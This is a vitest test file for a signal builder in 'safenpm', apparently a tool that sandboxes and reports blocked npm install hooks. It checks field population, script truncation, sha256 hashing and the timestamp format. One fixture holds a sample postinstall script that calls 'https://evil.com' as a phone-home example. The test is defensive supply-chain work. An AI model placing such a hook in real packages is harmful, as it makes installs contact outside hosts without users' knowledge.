import { describe, expect, it, vi } from 'vitest'
import crypto from 'crypto'

// signals.ts caches `os.homedir()` for the machineId config file at
// load time. The build* tests don't read the config so we don't need
// to redirect, but we mock os.homedir() to keep tests from touching
// the real ~/.safenpm/config.json.
vi.mock('os', async () => {
  const actual = await vi.importActual<typeof import('os')>('os')
  return {
    ...actual,
    homedir: () => '/tmp/non-existent-safenpm-test-home',
    default: { ...actual, homedir: () => '/tmp/non-existent-safenpm-test-home' },
  }
})

import { buildSignal } from './signals'
import type { SandboxResult } from '../types'

const blockedResult: SandboxResult = {
  pkg: {
    name: 'phone-home', version: '0.0.1', hook: 'postinstall',
    path: '/tmp/x',
    script: "require('https').get('https://evil.com')",
  },
  blocked: true, skipped: false, reason: 'network',
  output: '', durationMs: 5,
}

describe('buildSignal — wire shape', () => {
  it('produces a Signal with every required field populated', () => {
    const s = buildSignal(blockedResult)
    expect(s.package).toBe('phone-home')
    expect(s.version).toBe('0.0.1')
    expect(s.hook).toBe('postinstall')
    expect(s.reason).toBe('network')
    expect(typeof s.machineId).toBe('string')
    expect(typeof s.timestamp).toBe('string')
    expect(typeof s.platform).toBe('string')
  })

  it('truncates the script preview to 500 chars', () => {
    const long = blockedResult.pkg.script.padEnd(2000, 'x')
    const s = buildSignal({ ...blockedResult, pkg: { ...blockedResult.pkg, script: long } })
    expect(s.script.length).toBe(500)
  })

  it('records the full script length so the server can see truncation happened', () => {
    const long = 'x'.repeat(2000)
    const s = buildSignal({ ...blockedResult, pkg: { ...blockedResult.pkg, script: long } })
    expect(s.scriptLength).toBe(2000)
    expect(s.script.length).toBe(500)
  })

  it('uses sha256 over the full untruncated script for scriptHash', () => {
    const s = buildSignal(blockedResult)
    const expected = crypto.createHash('sha256').update(blockedResult.pkg.script).digest('hex')
    expect(s.scriptHash).toBe(expected)
    expect(s.scriptHash).toMatch(/^[a-f0-9]{64}$/)
  })

  it('emits a timestamp in ISO-8601 (Z) form', () => {
    const s = buildSignal(blockedResult)
    expect(s.timestamp).toMatch(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z$/)
  })

  it('reports a platform string in <platform>/<arch> shape', () => {
    const s = buildSignal(blockedResult)
    // Platform allows digits because Node returns `win32` on Windows.
    expect(s.platform).toMatch(/^[a-z0-9]+\/[a-z0-9_-]+$/)
  })
})
